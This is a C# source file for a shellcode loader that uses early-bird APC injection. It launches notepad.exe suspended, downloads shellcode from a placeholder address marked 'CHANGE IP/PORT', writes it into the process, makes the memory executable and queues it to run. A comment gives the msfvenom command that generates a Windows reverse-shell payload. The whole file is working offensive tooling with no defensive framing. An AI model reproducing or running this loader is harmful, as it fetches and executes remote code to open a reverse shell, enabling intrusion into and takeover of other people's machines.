using System.Net;
using static Kernel32;

public class ProcInjection {

    public static void Main(string[] args)
    {

        STARTUPINFO startInfo = new STARTUPINFO();
        PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

        var initSuccess = CreateProcess(null, @"C:\Windows\System32\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref startInfo, ref procInfo);

        if (initSuccess)
        {
            Console.WriteLine($"PID: {procInfo.dwProcessId}");
            Console.WriteLine($"TID: {procInfo.dwThreadId}");
        }

        WebClient wClient = new WebClient();

        //payload: CHANGE IP/PORT
        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -o shellcode.bin

        byte[] shellcode = wClient.DownloadData("http://127.0.0.1/shellcode.bin");

        // Allocate memory as Read/Write
        IntPtr hMemory = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Write shellcode
        IntPtr bytesWritten = IntPtr.Zero;
        bool success = WriteProcessMemory(procInfo.hProcess, hMemory, shellcode, shellcode.Length, ref bytesWritten);

        // Change memory to Read/Execute
        IntPtr proc_handle = procInfo.hProcess;
        success = VirtualProtectEx(proc_handle, hMemory, shellcode.Length, PAGE_EXECUTE_READ, out _);

        // Call QueueUserAPC
        IntPtr ptr = QueueUserAPC(hMemory, procInfo.hThread, IntPtr.Zero);

        // Resume thread
        IntPtr ThreadHandle = procInfo.hThread;
        ResumeThread(ThreadHandle);

    }

}